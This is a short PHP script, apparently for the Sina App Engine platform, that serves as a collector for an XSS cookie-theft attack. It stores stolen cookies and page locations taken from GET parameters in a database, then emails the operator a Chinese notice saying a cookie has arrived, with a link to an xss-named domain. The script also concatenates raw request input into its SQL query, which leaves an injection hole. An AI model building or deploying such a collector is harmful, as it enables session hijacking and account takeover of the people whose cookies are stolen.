<?php


$conn = mysql_connect(SAE_MYSQL_HOST_M.':'.SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
$location = $_GET['location'];
$cookie = $_GET['cookie'];
$sql = "INSERT INTO cookies (location,cookie) VALUES ('".$location."', '".$cookie."')";

mysql_select_db(SAE_MYSQL_DB, $conn);
mysql_query($sql, $conn);
mysql_close($conn);


$title = '亲，您的cookie 到了~';
$content = '您的cookie 到了~
猛戳此处查看：http://xss.chuhades.com';
$mail = new SaeMail();
$ret = $mail->quickSend( '收信邮箱' , $title, $content, '发信邮箱' , '发信邮箱密码' );
 
//发送失败时输出错误码和错误信息
if ($ret === false)
    var_dump($mail->errno(), $mail->errmsg());


?>